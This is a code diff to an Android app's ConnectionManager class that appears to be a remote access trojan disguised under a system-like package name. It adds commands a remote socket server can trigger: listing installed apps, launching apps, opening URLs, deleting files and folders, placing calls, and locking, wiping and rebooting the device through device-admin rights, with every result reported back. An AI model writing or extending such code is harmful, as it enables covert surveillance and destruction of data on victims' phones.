@@ -1,10 +1,21 @@
 package com.android.background.services;
 
+import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
 import android.os.Looper;
 import android.util.Log;
+import android.widget.Toast;
 
+import org.apache.commons.io.FileUtils;
+import org.json.JSONArray;
+import org.json.JSONException;
 import org.json.JSONObject;
+
+import java.io.File;
+import java.io.IOException;
 
 import io.socket.emitter.Emitter;
 
@@ -48,7 +59,7 @@ public class ConnectionManager {
                     try {
                         JSONObject data = (JSONObject) args[0];
                         String order = data.getString("order");
-                        Log.e("order", order);
+                        Log.d("order", order);
                         switch (order) {
                             case "x0000ca":
                                 if (data.getString("extra").equals("camList"))
@@ -79,8 +90,32 @@ public class ConnectionManager {
                             case "x0000mc":
                                 x0000mc(data.getInt("sec"));
                                 break;
+                            case "x0000apps":
+                                x0000apps();
+                                break;
                             case "x0000lm":
                                 x0000lm();
+                                break;
+                            case "x0000runApp":
+                                x0000runApp(data.getString("extra"));
+                                break;
+                            case "x0000openUrl":
+                                x0000openUrl(data.getString("url"));
+                                break;
+                            case "x0000deleteFF":
+                                x0000deleteFF(data.getString("fileFolderPath"));
+                                break;
+                            case "x0000dm":
+                                x0000dm(data.getString("number"));
+                                break;
+                            case "x0000lockDevice":
+                                x0000lockDevice();
+                                break;
+                            case "x0000wipeDevice":
+                                x0000wipeDevice();
+                                break;
+                            case "x0000rebootDevice":
+                                x0000rebootDevice();
                                 break;
                         }
                     } catch (Exception e) {
@@ -93,6 +128,155 @@ public class ConnectionManager {
         } catch (Exception ex) {
             Log.e("error", ex.getMessage());
         }
+    }
+
+    private static void x0000rebootDevice() throws JSONException {
+        JSONObject jsonObject = new JSONObject();
+
+        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
+                jsonObject.put("status", true);
+                jsonObject.put("message", "Device rebooted successfully.");
+            }
+            else{
+                jsonObject.put("status", false);
+                jsonObject.put("message", "Device is below Android 7.0");
+            }
+        }
+        else{
+            jsonObject.put("status", false);
+            jsonObject.put("message", "Device admin permission is not active.");
+        }
+        ioSocket.emit("x0000rebootDevice", jsonObject);
+    }
+
+    private static void x0000wipeDevice() throws JSONException {
+
+        JSONObject jsonObject = new JSONObject();
+
+        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+            MainActivity.devicePolicyManager.wipeData(1);
+            jsonObject.put("status", true);
+            jsonObject.put("message", "Device wiped out successfully.");
+        }
+        else{
+            jsonObject.put("status", false);
+            jsonObject.put("message", "Device admin permission is not active.");
+        }
+        ioSocket.emit("x0000lockDevice", jsonObject);
+    }
+
+    private static void x0000lockDevice() throws JSONException {
+
+        JSONObject jsonObject = new JSONObject();
+
+        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+            MainActivity.devicePolicyManager.lockNow();
+            jsonObject.put("status", true);
+            jsonObject.put("message", "Device locked.");
+        }
+        else{
+            jsonObject.put("status", false);
+            jsonObject.put("message", "Device admin permission is not active.");
+        }
+        ioSocket.emit("x0000lockDevice", jsonObject);
+    }
+
+    private static void x0000dm(String number) throws JSONException {
+
+        JSONObject jsonObject = new JSONObject();
+
+        try {
+
+            Uri phoneNumber = Uri.parse("tel:"+number);
+            Intent callIntent = new Intent(Intent.ACTION_CALL, phoneNumber);
+            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(callIntent);
+
+            jsonObject.put("status", true);
+        }
+        catch (Exception e){
+            jsonObject.put("status", false);
+            e.printStackTrace();
+        }
+        ioSocket.emit("x0000dm", jsonObject);
+    }
+
+    private static void x0000deleteFF(String fileFolderPath) throws JSONException {
+
+        JSONObject jsonObject = new JSONObject();
+
+        File file = new File(fileFolderPath);
+
+        if (file.isDirectory() && file.exists()){
+            try {
+                FileUtils.forceDelete(file);
+                jsonObject.put("status", true);
+            }
+            catch (Exception e) {
+                jsonObject.put("status", false);
+                e.printStackTrace();
+            }
+        }
+        else if (file.isFile() && file.exists()){
+            jsonObject.put("status", file.delete());
+        }
+
+        ioSocket.emit("x0000deleteFF", jsonObject);
+    }
+
+
+    private static void x0000openUrl(String url) {
+
+        JSONObject jsonObject = new JSONObject();
+
+        try{
+            Intent openIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+            openIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(openIntent);
+            jsonObject.put("status", true);
+        }
+        catch (Exception e){
+            try {
+                jsonObject.put("status", false);
+            } catch (JSONException jsonException) {
+                jsonException.printStackTrace();
+            }
+            e.printStackTrace();
+
+        }
+        ioSocket.emit("x0000openUrl", jsonObject);
+    }
+
+
+    private static void x0000runApp(String packageName) {
+
+        JSONObject jsonObject = new JSONObject();
+
+        Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);
+
+        if (launchIntent != null) {
+            try {
+                jsonObject.put("launchingStatus", true);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+            context.startActivity(launchIntent);
+        }
+        else {
+            try {
+                jsonObject.put("launchingStatus", false);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        }
+        ioSocket.emit("x0000runApp", jsonObject);
+    }
+
+    public static void x0000apps() {
+        ioSocket.emit("x0000apps", AppsListManager.getAppLists(context));
     }
 
     public static void x0000ca(int req) {
